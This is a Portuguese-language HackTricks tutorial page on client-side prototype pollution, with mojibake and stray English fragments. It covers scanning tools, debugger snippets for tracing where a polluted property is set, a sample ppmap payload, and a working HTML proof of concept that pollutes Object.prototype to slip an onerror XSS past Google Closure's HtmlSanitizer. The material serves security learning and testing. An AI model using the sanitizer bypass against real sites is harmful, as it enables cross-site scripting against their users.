# Polui√ß√£o de Prot√≥tipo no Lado do Cliente

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Descobrindo usando Ferramentas Autom√°ticas

As ferramentas [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **e** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) podem ser usadas para **encontrar vulnerabilidades de polui√ß√£o de prot√≥tipo**.

Al√©m disso, voc√™ tamb√©m pode usar a **extens√£o para navegador** [**PPScan**](https://github.com/msrkp/PPScan) para **escanear automaticamente** as **p√°ginas** que voc√™ **acessa** em busca de vulnerabilidades de polui√ß√£o de prot√≥tipo.

### Depurando onde uma propriedade √© usada <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Encontrando a causa raiz da Prototype Pollution <a href="#5530" id="5530"></a>

Uma vez que qualquer uma das ferramentas tenha **identificado** uma **vulnerabilidade de prototype pollution**, se o **c√≥digo** **n√£o** for muito **complexo**, voc√™ pode **procurar** no c√≥digo JS pelas **palavras-chave** **`location.hash/decodeURIComponent/location.search`** nas Ferramentas do Desenvolvedor do Chrome e encontrar o local vulner√°vel.

Se o c√≥digo for grande e complexo, h√° uma maneira f√°cil de **descobrir onde est√° o c√≥digo vulner√°vel**:

* Usando uma das ferramentas, **encontre uma vulnerabilidade** e obtenha um **payload** que ir√° **definir uma propriedade** no construtor. No ppmap, algo como isto ser√° fornecido: `constructor[prototype][ppmap]=reserved`
* Agora, defina um **ponto de interrup√ß√£o na primeira linha do c√≥digo JS** que ser√° executado na p√°gina e atualize a p√°gina com o payload para que a **execu√ß√£o seja pausada ali**.
* Enquanto a execu√ß√£o do JS estiver pausada, **cole o seguinte script no console JS**. Este c√≥digo indicar√° quando a propriedade 'ppmap' for criada, assim voc√™ poder√° encontrar onde ela foi criada.
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
Volte para **Sources** e clique em ‚Äú**Resume** script **execution**‚Äù. Depois de fazer isso, todo o **javascript** ser√° **executed** e o ppmap ser√° polu√≠do novamente como esperado. Com a ajuda do Snippet, podemos encontrar exatamente onde a propriedade ppmap √© polu√≠da. Podemos **click** na **Call** **Stack** e voc√™ ver√° **different** **stacks** onde a **pollution** **happened**.

Mas qual escolher? Na maioria das vezes, a Prototype Pollution ocorre em bibliotecas Javascript, ent√£o mire na stack que est√° anexada aos arquivos de biblioteca .js (olhe para o lado direito, como na imagem, para saber a qual endpoint a stack est√° anexada). Neste caso, temos 2 stacks nas linhas 4 e 6, logicamente escolheremos a linha 4 porque essa linha √© a primeira vez onde a Pollution ocorre, o que significa que esta linha √© a raz√£o da vulnerabilidade. Clicar na stack nos redirecionar√° para o c√≥digo vulner√°vel.

![](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Encontrando Script Gadgets

O gadget √© o **code that will be abused once a PP vulnerability is discovered**.

Se a aplica√ß√£o for simples, podemos **search** por **keywords** como **`srcdoc/innerHTML/iframe/createElement`** e revisar o c√≥digo-fonte para verificar se **leads to javascript execution**. √Äs vezes, as t√©cnicas mencionadas podem n√£o encontrar gadgets de forma alguma. Nesse caso, a revis√£o pura do c√≥digo-fonte revela alguns gadgets interessantes como no exemplo abaixo.

### Exemplo de Encontrando PP gadget no c√≥digo da biblioteca Mithil

Confira este writeup: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompila√ß√£o de payloads para bibliotecas vulner√°veis

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass de HTML Sanitizers via PP

[**Esta pesquisa**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) mostra gadgets PP para usar para **bypass the sanizations** fornecidos por algumas bibliotecas de sanitizadores HTML:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Refer√™ncias

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Aprenda AWS hacking do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
